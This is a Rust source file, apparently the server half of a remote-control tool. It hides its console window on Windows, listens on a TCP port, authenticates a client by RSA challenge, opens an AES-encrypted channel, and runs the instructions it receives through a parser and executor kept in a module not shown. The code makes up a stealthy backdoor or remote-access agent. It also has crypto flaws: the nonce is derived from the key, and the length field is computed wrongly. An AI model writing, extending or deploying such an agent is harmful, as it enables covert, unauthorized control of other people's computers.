#![windows_subsystem = "windows"]
use lazy_static::{lazy_static, initialize as ls_initialize};
use rand::{thread_rng, RngCore};
use local_ip_address::local_ip;
use rsa::{RsaPublicKey, Pkcs1v15Encrypt, pkcs8::DecodePublicKey, PublicKey};
use aes_gcm_siv::{aead::Aead, Aes256GcmSiv, Nonce, KeyInit};
use std::{
    net::{TcpListener, TcpStream, Shutdown},
    io::{self, Write, Read},
    thread,
    time,
};

mod constants;
use constants::{
    LISTENING_PORT,
    PEM_CLIENT_PUBLIC_KEY,
};

mod infrastructure;
use infrastructure::*;

lazy_static! {
    pub static ref CLIENT_PUBLIC_KEY : RsaPublicKey = RsaPublicKey::from_public_key_pem(&PEM_CLIENT_PUBLIC_KEY).unwrap();
}

fn handle_client(mut stream : TcpStream) -> io::Result<()> {
    stream.set_read_timeout(Some(time::Duration::from_secs(5)))?;
    stream.set_write_timeout(Some(time::Duration::from_secs(5)))?;
    println!("[INFO] connection received from : {:?}", stream.peer_addr()?);
    let mut rng = thread_rng();

    // RSA authentication
    {
        let mut random_token : [u8; 128] = [0; 128];
        rng.fill_bytes(&mut random_token);
        stream.write(&CLIENT_PUBLIC_KEY.encrypt(&mut rng, Pkcs1v15Encrypt, &random_token).unwrap())?;
        let mut token_buffer : [u8; 128] = [0; 128];
        stream.read(&mut token_buffer)?;
        if token_buffer != random_token {
            println!("[WARNING] tokens do not match, closing the connection");
            stream.shutdown(std::net::Shutdown::Both);
            return Ok(());
        }
        println!("[INFO] connection accepted, creating a shared key");
    }

    // AES encryption
    let key = Aes256GcmSiv::generate_key(&mut rng);
    stream.write(&CLIENT_PUBLIC_KEY.encrypt(&mut rng, Pkcs1v15Encrypt, &key as &[u8]).unwrap())?;
    let cipher = Aes256GcmSiv::new(&key);
    let nonce = Nonce::from_slice(&key[..12] as &[u8]);
    println!("[INFO] connection secured");

    // client-server communication
    stream.set_read_timeout(Some(time::Duration::from_secs(300)));
    let mut buffer : Vec<u8> = vec![0; 2048];
    loop {
        stream.read(&mut buffer)?;
        let size : usize = buffer[0] as usize + buffer[1] as usize + buffer[2] as usize + buffer[3] as usize +
                           buffer[4] as usize + buffer[5] as usize + buffer[6] as usize + buffer[7] as usize;
        let encoded_plaintext = match cipher.decrypt(nonce, (&buffer[8..size+8]).as_ref()) {
            Ok(text) => text,
            Err(_) => {
                println!("[ERROR] decryption failed");
                "".as_bytes().to_vec()
            }
        };
        
        let plaintext = String::from_utf8_lossy(&encoded_plaintext);
        let mut instructions_builder = InstructionsBuilder::new();
        instructions_builder.process(plaintext.trim().split(" ;; ").collect::<Vec<&str>>());
        let instructions = instructions_builder.finalize();
        println!("{:#?}", instructions);
        for instruction in instructions {
            match instruction.instruction_type_ {
                InstructionType::Exit => {
                    println!("[INFO] shutting down connection");
                    stream.shutdown(Shutdown::Both);
                    return Ok(());
                },
                _ => instruction.execute(),
            }
        }  
    }    
}

fn main() -> io::Result<()> {
    ls_initialize(&CLIENT_PUBLIC_KEY);
    let LOCAL_IP = local_ip().unwrap();
    loop {
        println!("[INFO] listening on {}:{}", LOCAL_IP, LISTENING_PORT);
        let listener : TcpListener = TcpListener::bind(&format!("{}:{}", &LOCAL_IP, LISTENING_PORT))?;
        for stream in listener.incoming() {
            thread::spawn(|| {handle_client(stream?)});
            continue;
        }
    }
}
